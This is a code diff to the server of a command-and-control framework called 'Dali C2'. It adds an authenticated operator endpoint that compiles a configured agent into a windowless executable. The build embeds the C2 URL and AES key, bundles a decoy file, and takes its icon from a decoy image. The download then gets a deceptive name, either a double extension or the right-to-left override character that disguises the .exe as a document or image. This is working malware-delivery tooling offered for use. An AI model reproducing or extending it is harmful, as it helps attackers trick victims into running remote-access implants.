@@ -10,6 +10,10 @@ import json
 import csv
 import io
 from datetime import datetime, timedelta
+import subprocess
+import tempfile
+import shutil
+from pydantic import BaseModel
 from .auth import create_access_token, get_current_user, verify_password, get_password_hash
 from fastapi.security import OAuth2PasswordRequestForm
 
@@ -20,7 +24,7 @@ from shared.schemas import Task
 from shared.crypto import encrypt_payload, decrypt_payload
 from .store import DataStore
 
-app = FastAPI(title="Dali C 2x2")
+app = FastAPI(title="Dali C2")
 store = DataStore()
 
 class ConnectionManager:
@@ -213,6 +217,149 @@ async def delete_agent(agent_id: str, user: str = Depends(get_current_user)):
         raise HTTPException(status_code=404, detail="Agent not found")
     await manager.broadcast({"event": "agent_deleted", "agent_id": agent_id})
     return {"status": "success"}
+
+from fastapi import Form, UploadFile, File
+try:
+    from PIL import Image
+except ImportError:
+    Image = None
+
+class BuildRequest(BaseModel):
+    c2_url: str
+    aes_key: str
+    identity: str
+
+@app.post("/operator/build")
+async def build_agent(
+    c2_url: str = Form(...),
+    aes_key: str = Form(...),
+    identity: str = Form(...),
+    decoy: UploadFile = File(None),
+    rtlo: bool = Form(False),
+    user: str = Depends(get_current_user)
+):
+    """Generates a configured agent executable with optional decoy file and RTLO spoofing."""
+    try:
+        # 1. Setup temporary workspace
+        with tempfile.TemporaryDirectory() as tmp_dir:
+            project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+            
+            # Copy necessary folders to workspace
+            shutil.copytree(os.path.join(project_root, "agent"), os.path.join(tmp_dir, "agent"), 
+                            ignore=shutil.ignore_patterns('__pycache__', '.agent_id', 'dist', 'build'))
+            shutil.copytree(os.path.join(project_root, "shared"), os.path.join(tmp_dir, "shared"),
+                            ignore=shutil.ignore_patterns('__pycache__'))
+            
+            # 2. Write configuration to .env in the workspace
+            env_content = f"""C2_SERVER_URL={c2_url}
+C2_AES_KEY={aes_key}
+AGENT_IDENTITY={identity}
+"""
+            with open(os.path.join(tmp_dir, "agent", ".env"), "w") as f:
+                f.write(env_content)
+            
+            # 3. Handle decoy file and icon spoofing
+            decoy_path_for_pyi = None
+            icon_path = None
+            decoy_ext = ""
+            if decoy:
+                decoy_ext = decoy.filename.split('.')[-1].lower()
+                decoy_name = f"decoy.{decoy_ext}"
+                target_decoy = os.path.join(tmp_dir, "agent", decoy_name)
+                content = await decoy.read()
+                with open(target_decoy, "wb") as f:
+                    f.write(content)
+                decoy_path_for_pyi = target_decoy
+
+                # Auto-generate icon if it's an image
+                if Image and decoy_ext in ['jpg', 'jpeg', 'png', 'ico']:
+                    try:
+                        icon_temp = os.path.join(tmp_dir, "icon.ico")
+                        img = Image.open(io.BytesIO(content))
+                        icon_sizes = [(16, 16), (32, 32), (48, 48), (64, 64), (128, 128), (256, 256)]
+                        img.save(icon_temp, format='ICO', sizes=icon_sizes)
+                        icon_path = icon_temp
+                    except Exception as e:
+                        print(f"[!] Icon generation failed: {e}")
+
+            # 4. Create a dummy __init__.py in agent if missing
+            with open(os.path.join(tmp_dir, "agent", "__init__.py"), "a"): pass
+            
+            # 5. Run PyInstaller
+            agent_source = os.path.join(tmp_dir, "agent", "agent.py")
+            cmd = [
+                sys.executable, "-m", "PyInstaller",
+                "--onefile",
+                "--noconsole",
+                "--name=dali_agent",
+                f"--add-data={os.path.join(tmp_dir, 'shared')}{os.pathsep}shared",
+                f"--add-data={os.path.join(tmp_dir, 'agent', 'plugins')}{os.pathsep}plugins",
+                f"--add-data={os.path.join(tmp_dir, 'agent', '.env')}{os.pathsep}.",
+                "--paths", tmp_dir,
+                "--paths", os.path.join(tmp_dir, "agent"),
+                "--hidden-import", "executor",
+                "--hidden-import", "shared",
+                "--collect-submodules", "plugins",
+                "--workpath", os.path.join(tmp_dir, "work"),
+                "--specpath", tmp_dir,
+                "--distpath", os.path.join(tmp_dir, "dist"),
+                "--clean"
+            ]
+
+            if icon_path:
+                cmd.extend(["--icon", icon_path])
+
+            if decoy_path_for_pyi:
+                cmd.extend(["--add-data", f"{decoy_path_for_pyi}{os.pathsep}."])
+            
+            cmd.append(agent_source)
+            process = subprocess.run(cmd, capture_output=True, text=True, cwd=tmp_dir)
+            
+            if process.returncode != 0:
+                print(f"[!] PyInstaller Error: {process.stderr}")
+                raise HTTPException(status_code=500, detail=f"Build failed: {process.stderr}")
+            
+            # 6. Determine Deceptive Filename
+            original_name = "dali_agent.exe"
+            if decoy:
+                base = decoy.filename.rsplit('.', 1)[0]
+                original_name = f"{base}.{decoy_ext}.exe"
+            
+            if rtlo and decoy:
+                # RTLO Trick: \u202E reversals the following characters
+                # Example: Report_ [RTLO] nosj.exe -> Report_ exe.json
+                # We need to provide the name such that it looks like our target after reversal
+                rtlo_char = "\u202E"
+                # Target: base + RTLO + reversed(target_extension) + ".exe"
+                # If target is .exe.json, we want reversed(nosj.exe)
+                target_ext_reversed = f"{decoy_ext}.exe"[::-1]
+                deceptive_name = f"{base}_{rtlo_char}{target_ext_reversed}.exe"
+            else:
+                deceptive_name = original_name
+
+            if os.name != "nt" and not rtlo:
+                deceptive_name = original_name.replace(".exe", "")
+
+            # 7. Locate and read the generated EXE
+            internal_exe_name = "dali_agent.exe" if os.name == "nt" else "dali_agent"
+            exe_path = os.path.join(tmp_dir, "dist", internal_exe_name)
+            
+            if not os.path.exists(exe_path):
+                raise HTTPException(status_code=500, detail="Executable not found after build")
+            
+            with open(exe_path, "rb") as f:
+                content = f.read()
+            
+            # 8. Stream back the file
+            return StreamingResponse(
+                io.BytesIO(content),
+                media_type="application/octet-stream",
+                headers={"Content-Disposition": f"attachment; filename={deceptive_name}"}
+            )
+            
+    except Exception as e:
+        print(f"[!] Build error: {e}")
+        raise HTTPException(status_code=500, detail=str(e))
 
 if __name__ == "__main__":
     host = os.getenv("SERVER_HOST", "0.0.0.0")
